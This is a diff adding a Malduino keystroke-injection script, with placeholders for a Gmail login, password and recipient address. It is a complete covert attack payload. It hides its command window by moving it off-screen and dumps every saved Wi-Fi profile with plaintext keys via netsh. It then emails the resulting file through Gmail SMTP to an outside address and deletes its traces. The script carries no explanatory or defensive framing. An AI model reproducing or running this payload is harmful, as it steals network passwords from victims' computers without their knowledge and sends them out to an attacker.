@@ -1,0 +1,130 @@
+YOURACCOUNTLOGIN: Your gmail account
+YOURACCOUNTPASSWORD: Your gmail password
+SENDTOACCOUNT: The email you want to send info.txt to
+
+----Malduino Script----
+REM Hide CMD
+DELAY 2000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 600
+ALT SPACE
+DELAY 100
+STRING M
+DOWNARROW
+REPEAT 500
+ENTER
+REM Capture wifi_info and send via email
+DELAY 200
+STRING echo Wi-Fi Information > %userprofile%\wifi_info.txt
+ENTER
+DELAY 100
+STRING echo ==================================== >> %userprofile%\wifi_info.txt
+ENTER
+DELAY 100
+STRING netsh wlan show profile >> %userprofile%\wifi_info.txt
+ENTER
+DELAY 100
+STRING powershell
+ENTER
+DELAY 1000
+STRING $regex = ": .*"
+ENTER
+DELAY 100
+STRING $in = "wifi_info.txt"
+ENTER
+DELAY 100
+STRING $out = "temp1.txt"
+ENTER
+DELAY 100
+STRING select-string -Path $in -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $out
+ENTER
+DELAY 500
+STRING $regex = "[^: ].*"
+ENTER
+DELAY 100
+STRING $in = "temp1.txt"
+ENTER
+DELAY 100
+STRING $out = "temp2.txt"
+ENTER
+DELAY 100
+STRING select-string -Path $in -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $out
+ENTER
+DELAY 500
+STRING Get-Content temp1.txt | Set-Content -Encoding utf8 temp3.txt
+ENTER
+DELAY 1000
+STRING Get-Content temp2.txt | Set-Content -Encoding utf8 temp4.txt
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 100
+STRING FOR /F "tokens=*" %A in (temp4.txt) DO netsh wlan show profile "%A" key=clear >> %userprofile%\wifi_info.txt
+ENTER
+DELAY 100
+STRING del temp1
+ENTER
+DELAY 500
+STRING del temp2
+ENTER
+DELAY 500
+STRING del temp3
+ENTER
+DELAY 500
+STRING del temp4
+ENTER
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+DELAY 100
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+DELAY 100
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+DELAY 100
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOURACCOUNTLOGIN', 'YOURACCOUNTPASSWORD');
+ENTER
+DELAY 100
+STRING cls
+ENTER
+DELAY 100
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 100
+STRING $ReportEmail.From = 'YOURACCOUNTLOGIN'
+ENTER
+DELAY 100
+STRING cls
+ENTER
+DELAY 100
+STRING $ReportEmail.To.Add('SENDTOACCOUNT')
+ENTER
+DELAY 100
+STRING cls
+ENTER
+DELAY 100
+STRING $ReportEmail.Subject = 'IP and system info'
+ENTER
+DELAY 100
+STRING $ReportEmail.Body = 'The info is attached!' 
+ENTER
+DELAY 100
+STRING $ReportEmail.Attachments.Add('wifi_info.txt')
+ENTER
+DELAY 100
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+DELAY 200
+STRING del wifi_info.txt & exit
+ENTER
